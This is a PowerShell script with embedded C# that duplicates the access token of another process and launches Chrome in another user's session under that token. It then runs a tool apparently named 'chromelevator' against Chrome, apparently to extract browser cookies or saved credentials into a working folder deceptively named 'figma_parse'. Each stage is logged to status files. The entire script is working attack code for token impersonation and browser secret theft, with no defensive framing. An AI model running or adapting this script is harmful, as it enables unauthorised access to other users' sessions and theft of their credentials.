$code = @'
using System;
using System.Runtime.InteropServices;
public class T {
  [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr OpenProcess(uint a, bool i, uint pid);
  [DllImport("advapi32.dll", SetLastError=true)] public static extern bool OpenProcessToken(IntPtr h, uint a, out IntPtr t);
  [DllImport("advapi32.dll", SetLastError=true)] public static extern bool DuplicateTokenEx(IntPtr t, uint a, IntPtr sa, int il, int tt, out IntPtr nt);
  [DllImport("advapi32.dll", SetLastError=true)] public static extern bool SetTokenInformation(IntPtr t, int c, ref uint v, uint l);
  [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)] public static extern bool CreateProcessAsUser(IntPtr t, string app, string cmd, IntPtr pa, IntPtr ta, bool ih, uint f, IntPtr env, string cwd, ref SI si, out PI pi);
  [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)] public struct SI { public int cb; public string r; public string d; public string t; public int x; public int y; public int xs; public int ys; public int xc; public int yc; public int fa; public int fl; public short sw; public short cr; public IntPtr r2; public IntPtr i; public IntPtr o; public IntPtr e; }
  [StructLayout(LayoutKind.Sequential)] public struct PI { public IntPtr h; public IntPtr t; public int pid; public int tid; }
  public static IntPtr GetSessionToken(uint targetSid, uint pid) {
    IntPtr h = OpenProcess(0x0400, false, pid);
    if (h == IntPtr.Zero) return IntPtr.Zero;
    IntPtr tok;
    if (!OpenProcessToken(h, 0x0002 | 0x0008, out tok)) return IntPtr.Zero;
    IntPtr newtok;
    if (!DuplicateTokenEx(tok, 0x02000000, IntPtr.Zero, 2, 1, out newtok)) return IntPtr.Zero;
    uint sid = targetSid;
    SetTokenInformation(newtok, 12, ref sid, 4);
    return newtok;
  }
}
'@
Add-Type -TypeDefinition $code

$tok = [T]::GetSessionToken(2, 14584)
if ($tok -eq [IntPtr]::Zero) { Set-Content C:\tmp\figma_parse\step1.txt get-token-fail; exit 1 }
Set-Content C:\tmp\figma_parse\step1.txt token-ok

$si = New-Object T+SI
$si.cb = [Runtime.InteropServices.Marshal]::SizeOf($si)
$si.d = 'winsta0\default'
$pi = New-Object T+PI
$ok = [T]::CreateProcessAsUser($tok, 'C:\Program Files\Google\Chrome\Application\chrome.exe', $null, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0, [IntPtr]::Zero, 'C:\', [ref]$si, [ref]$pi)
Set-Content C:\tmp\figma_parse\step2.txt ("chrome-ok=$ok pid=$($pi.pid)")

Start-Sleep -Seconds 8

$si2 = New-Object T+SI
$si2.cb = [Runtime.InteropServices.Marshal]::SizeOf($si2)
$si2.d = 'winsta0\default'
$pi2 = New-Object T+PI
$cmd = 'C:\tmp\figma_parse\chromelevator_x64.exe -k -v -o C:\tmp\figma_parse chrome'
$ok2 = [T]::CreateProcessAsUser($tok, $null, $cmd, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0, [IntPtr]::Zero, 'C:\tmp\figma_parse\', [ref]$si2, [ref]$pi2)
Set-Content C:\tmp\figma_parse\step3.txt ("lev-ok=$ok2 pid=$($pi2.pid)")

Start-Sleep -Seconds 40
Set-Content C:\tmp\figma_parse\step4.txt done
